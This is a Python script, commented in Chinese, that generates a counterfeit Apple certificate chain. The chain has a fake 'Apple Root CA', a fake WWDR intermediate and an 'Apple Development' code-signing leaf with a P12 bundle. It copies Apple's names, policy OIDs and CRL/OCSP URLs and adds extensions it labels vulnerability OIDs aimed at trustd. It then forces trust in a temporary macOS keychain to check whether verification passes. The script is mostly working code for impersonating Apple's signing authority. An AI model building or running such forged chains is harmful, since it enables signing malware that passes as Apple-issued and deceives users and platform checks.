#!/usr/bin/env python3
"""漏洞 OID 测试证书生成器 - Apple 官方命名
输出:
  Apple Root CA.cer                根证书
  AppleWWDRCAG3.cer                中间证书
  Apple Development: <TeamID>.cer  叶子证书（开发证书）
  Apple Development: <TeamID>.p12  P12 打包
有效期: 1970-01-01 ~ 9999-12-31
"""
import datetime, os, sys, base64, subprocess
from cryptography import x509
from cryptography.x509.oid import ObjectIdentifier, NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization import pkcs12

# ============================================================
TEAM_ID = sys.argv[1] if len(sys.argv) > 1 else "59GAB85EFG"
OUTPUT_DIR = sys.argv[2] if len(sys.argv) > 2 else "./cert_output"
CERT_PASS = sys.argv[3] if len(sys.argv) > 3 else "1"

HEADER_B64 = "oi5z1pqAnwdA+zl3bbCS0Qr2dqU="

os.makedirs(OUTPUT_DIR, exist_ok=True)

# ============================================================
# OID 定义
# ============================================================
OID_ROOT_GENERIC   = ObjectIdentifier("1.2.840.113635.100.1.2")
OID_ROOT_CODESIGN  = ObjectIdentifier("1.2.840.113635.100.1.108")
OID_ROOT_PRIVATE   = ObjectIdentifier("1.2.840.113635.100.1.115")
OID_POLICY_5_1     = ObjectIdentifier("1.2.840.113635.100.5.1")
OID_APPLE_ISSUED_1 = ObjectIdentifier("1.2.840.113635.100.6.86")
OID_APPLE_ISSUED_2 = ObjectIdentifier("1.2.840.113635.100.6.87")
OID_PROD_MARK      = ObjectIdentifier("1.2.840.113635.100.6.27.11.1")
OID_LEAF_MARK      = ObjectIdentifier("1.2.840.113635.100.6.27.18")
OID_IPA_SIGNING    = ObjectIdentifier("1.2.840.113635.100.6.1.13")
OID_WWDR           = ObjectIdentifier("1.2.840.113635.100.6.2.1")
OID_INTEG          = ObjectIdentifier("1.2.840.113635.100.6.3.1")
OID_SEC_BOOT       = ObjectIdentifier("1.2.840.113635.100.6.3.2")
OID_1_x = [ObjectIdentifier(f"1.2.840.113635.100.6.1.{i}") for i in 
           [1,2,3,4,5,6,7,8,9,10,14,21,22,25]]

# 漏洞 OID
OID_TRUSTD_1        = ObjectIdentifier("1.2.840.113635.100.6.2.10")
OID_TRUSTD_2        = ObjectIdentifier("1.2.840.113635.100.6.51")
OID_ANY_EKU         = ObjectIdentifier("2.5.29.37.0")
OID_LOGOTYPE        = ObjectIdentifier("1.3.6.1.5.5.7.1.12")
OID_NAME_CONSTRAINTS = ObjectIdentifier("2.5.29.30")

RESULTS = []

# ============================================================
# 工具函数
# ============================================================
def run_cmd(cmd, timeout=15):
    try:
        return subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return None

def gen_key(bits=2048):
    return rsa.generate_private_key(65537, bits, default_backend())

def write_der_with_header(path, cert):
    """写入 DER 格式证书，附加自定义文件头"""
    der_data = cert.public_bytes(serialization.Encoding.DER)
    try:
        header = base64.b64decode(HEADER_B64)
    except:
        header = b""
    with open(path, "wb") as f:
        f.write(header + der_data)

def verify_with_forced_trust(cert_path, test_name):
    print(f"\n🔍 测试: {test_name}")
    
    tmp_keychain = os.path.join(OUTPUT_DIR, f"tmp_{abs(hash(test_name)) % 10000}.keychain")
    tmp_password = "test123"
    
    try:
        run_cmd(["security", "delete-keychain", tmp_keychain])
        run_cmd(["rm", "-rf", tmp_keychain + "-db"])
        
        result = run_cmd(["security", "create-keychain", "-p", tmp_password, tmp_keychain])
        if result is None or result.returncode != 0:
            print(f"  ❌ 创建钥匙串失败")
            RESULTS.append((test_name, "❌ 钥匙串创建失败", ""))
            return
        
        run_cmd(["security", "unlock-keychain", "-p", tmp_password, tmp_keychain])
        
        result = run_cmd(["security", "add-certificates", "-k", tmp_keychain, cert_path])
        if result is None or "error" in result.stderr.lower():
            print(f"  ❌ 导入失败")
            RESULTS.append((test_name, "❌ 导入失败", ""))
            return
        
        run_cmd(["security", "add-trusted-cert", "-r", "trustRoot",
                 "-p", "ssl", "-p", "basic", "-p", "codeSign",
                 "-k", tmp_keychain, cert_path])
        
        result = run_cmd(["security", "verify-cert", "-k", tmp_keychain, "-c", cert_path])
        
        if result is None:
            RESULTS.append((test_name, "⏰ 超时", ""))
        else:
            output = result.stdout + result.stderr
            if "certificate verification successful" in output.lower():
                print(f"  ✅ 验证通过！")
                RESULTS.append((test_name, "✅ 通过", output))
            else:
                print(f"  ❌ 被拒绝")
                RESULTS.append((test_name, "❌ 拒绝", output))
    except Exception as e:
        RESULTS.append((test_name, f"💥 {e}", ""))

# ============================================================
# 构建证书
# ============================================================
def build_cert(subject, issuer, issuer_key, subject_key, is_ca=False):
    pub = subject_key.public_key()
    builder = x509.CertificateBuilder()
    builder = builder.subject_name(subject)
    builder = builder.issuer_name(issuer)
    builder = builder.serial_number(x509.random_serial_number())
    builder = builder.not_valid_before(datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc))
    builder = builder.not_valid_after(datetime.datetime(9999, 12, 31, 23, 59, 59, tzinfo=datetime.timezone.utc))
    builder = builder.public_key(pub)
    
    builder = builder.add_extension(
        x509.BasicConstraints(ca=is_ca, path_length=None), critical=True)
    builder = builder.add_extension(
        x509.SubjectKeyIdentifier.from_public_key(pub), critical=False)
    builder = builder.add_extension(
        x509.AuthorityKeyIdentifier.from_issuer_public_key(
            issuer_key.public_key()), critical=False)

    if is_ca:
        builder = builder.add_extension(
            x509.KeyUsage(digital_signature=True, key_cert_sign=True,
                          crl_sign=True, content_commitment=False,
                          key_encipherment=False, data_encipherment=False,
                          key_agreement=False, encipher_only=False,
                          decipher_only=False), critical=True)
        builder = builder.add_extension(
            x509.CertificatePolicies([
                x509.PolicyInformation(OID_ROOT_GENERIC, policy_qualifiers=None),
                x509.PolicyInformation(OID_ROOT_CODESIGN, policy_qualifiers=None),
                x509.PolicyInformation(OID_ROOT_PRIVATE, policy_qualifiers=None),
            ]), critical=False)
    else:
        builder = builder.add_extension(
            x509.KeyUsage(digital_signature=True, content_commitment=False,
                          key_encipherment=False, data_encipherment=False,
                          key_agreement=False, key_cert_sign=False, crl_sign=False,
                          encipher_only=False, decipher_only=False), critical=True)
        builder = builder.add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CODE_SIGNING]), critical=True)
        builder = builder.add_extension(
            x509.CertificatePolicies([
                x509.PolicyInformation(OID_POLICY_5_1, policy_qualifiers=[
                    "https://www.apple.com/certificateauthority/"]),
                x509.PolicyInformation(OID_ROOT_PRIVATE, policy_qualifiers=None),
                x509.PolicyInformation(OID_APPLE_ISSUED_1, policy_qualifiers=None),
                x509.PolicyInformation(OID_APPLE_ISSUED_2, policy_qualifiers=None),
                x509.PolicyInformation(OID_PROD_MARK, policy_qualifiers=None),
                x509.PolicyInformation(OID_LEAF_MARK, policy_qualifiers=None),
            ]), critical=False)

    builder = builder.add_extension(
        x509.CRLDistributionPoints([
            x509.DistributionPoint(
                full_name=[x509.UniformResourceIdentifier("http://crl.apple.com/root.crl")],
                relative_name=None, reasons=None, crl_issuer=None
            )
        ]), critical=False)
    builder = builder.add_extension(
        x509.AuthorityInformationAccess([
            x509.AccessDescription(
                x509.oid.AuthorityInformationAccessOID.OCSP,
                x509.UniformResourceIdentifier("http://ocsp.apple.com/ocsp03-wwdr01")
            )
        ]), critical=False)
    builder = builder.add_extension(
        x509.SubjectAlternativeName([x509.RFC822Name("apple@apple.com")]), critical=False)

    if not is_ca:
        for oid in OID_1_x:
            builder = builder.add_extension(
                x509.UnrecognizedExtension(oid, b'\x05\x00'), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_IPA_SIGNING, TEAM_ID.encode()), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_WWDR, b'\x05\x00'), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_INTEG, b'\x05\x00'), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_SEC_BOOT, b'\x05\x00'), critical=False)
        # 漏洞 OID
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_TRUSTD_1, b'\x05\x00'), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_TRUSTD_2, b'\x05\x00'), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_ANY_EKU, b'\x05\x00'), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_LOGOTYPE, b'\x05\x00'), critical=False)
        builder = builder.add_extension(
            x509.UnrecognizedExtension(OID_NAME_CONSTRAINTS, b'\x05\x00'), critical=False)

    return builder.sign(issuer_key, hashes.SHA256(), default_backend())

# ============================================================
# 主流程
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("Apple 高仿证书生成器（漏洞 OID 版）")
    print(f"有效期: 1970-01-01 ~ 9999-12-31")
    print(f"Team ID: {TEAM_ID}")
    print(f"输出目录: {OUTPUT_DIR}")
    print("=" * 60)

    # --- 根证书 ---
    print("\n>>> Apple Root CA")
    root_key = gen_key()
    root_subj = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Apple Inc."),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Apple Certification Authority"),
        x509.NameAttribute(NameOID.COMMON_NAME, "Apple Root CA"),
    ])
    root_cert = build_cert(root_subj, root_subj, root_key, root_key, is_ca=True)
    
    root_pem = os.path.join(OUTPUT_DIR, "Apple Root CA.cer")
    with open(root_pem, "wb") as f:
        f.write(root_cert.public_bytes(serialization.Encoding.PEM))
    # 带文件头的 DER
    write_der_with_header(os.path.join(OUTPUT_DIR, "Apple Root CA.der"), root_cert)
    print(f"✅ Apple Root CA.cer")

    # --- 中间证书 ---
    print("\n>>> AppleWWDRCAG3")
    codeca_key = gen_key()
    codeca_subj = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Apple Inc."),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "G3"),
        x509.NameAttribute(NameOID.COMMON_NAME, "Apple Worldwide Developer Relations Certification Authority"),
    ])
    codeca_cert = build_cert(codeca_subj, root_subj, root_key, codeca_key, is_ca=True)
    
    codeca_pem = os.path.join(OUTPUT_DIR, "AppleWWDRCAG3.cer")
    with open(codeca_pem, "wb") as f:
        f.write(codeca_cert.public_bytes(serialization.Encoding.PEM))
    write_der_with_header(os.path.join(OUTPUT_DIR, "AppleWWDRCAG3.der"), codeca_cert)
    print(f"✅ AppleWWDRCAG3.cer")

    # --- 叶子证书 ---
    leaf_name = f"Apple Development: {TEAM_ID}"
    print(f"\n>>> {leaf_name}")
    dev_key = gen_key()
    dev_subj = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Apple Inc."),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, TEAM_ID),
        x509.NameAttribute(NameOID.COMMON_NAME, "Apple Development"),
    ])
    dev_cert = build_cert(dev_subj, codeca_subj, codeca_key, dev_key, is_ca=False)
    
    leaf_cer = os.path.join(OUTPUT_DIR, f"Apple Development: {TEAM_ID}.cer")
    with open(leaf_cer, "wb") as f:
        f.write(dev_cert.public_bytes(serialization.Encoding.PEM))
    write_der_with_header(os.path.join(OUTPUT_DIR, f"Apple Development: {TEAM_ID}.der"), dev_cert)
    print(f"✅ Apple Development: {TEAM_ID}.cer")

    # --- P12 ---
    print(f"\n>>> P12")
    p12_path = os.path.join(OUTPUT_DIR, f"Apple Development: {TEAM_ID}.p12")
    p12_data = pkcs12.serialize_key_and_certificates(
        b"Apple Development",
        dev_key, dev_cert,
        [codeca_cert, root_cert],
        serialization.BestAvailableEncryption(CERT_PASS.encode())
    )
    with open(p12_path, "wb") as f:
        f.write(p12_data)
    print(f"✅ Apple Development: {TEAM_ID}.p12")

    # --- 验证叶子证书 ---
    print("\n" + "=" * 60)
    print("开始验证...")
    print("=" * 60)
    verify_with_forced_trust(leaf_cer, leaf_name)

    # --- 汇总 ---
    print("\n" + "=" * 60)
    print("生成文件清单")
    print("=" * 60)
    files = [
        "Apple Root CA.cer",
        "Apple Root CA.der",
        "AppleWWDRCAG3.cer",
        "AppleWWDRCAG3.der",
        f"Apple Development: {TEAM_ID}.cer",
        f"Apple Development: {TEAM_ID}.der",
        f"Apple Development: {TEAM_ID}.p12",
    ]
    for f in files:
        path = os.path.join(OUTPUT_DIR, f)
        size = os.path.getsize(path) if os.path.exists(path) else 0
        print(f"  {f:45s}  {size:>8d} bytes")
    
    print("\n" + "=" * 60)
    print("证书中包含的漏洞 OID")
    print("=" * 60)
    vuln_oids = [
        ("1.2.840.113635.100.6.2.10", "trustd 中间 CA 策略"),
        ("1.2.840.113635.100.6.51",   "trustd 内部策略 (skipping)"),
        ("2.5.29.37.0",               "anyExtendedKeyUsage"),
        ("1.3.6.1.5.5.7.1.12",       "证书 Logo 扩展"),
        ("2.5.29.30",                 "名称约束"),
    ]
    for oid, desc in vuln_oids:
        print(f"  {oid:40s}  {desc}")
    
    print("\n" + "=" * 60)
    print("验证结果")
    print("=" * 60)
    for name, status, _ in RESULTS:
        print(f"  {status} | {name}")
    
    print(f"\n✅ 完成")
    print(f"   CER 文件: {OUTPUT_DIR}/Apple Development: {TEAM_ID}.cer")
    print(f"   P12 文件: {OUTPUT_DIR}/Apple Development: {TEAM_ID}.p12")
    print(f"   密码: {CERT_PASS}")
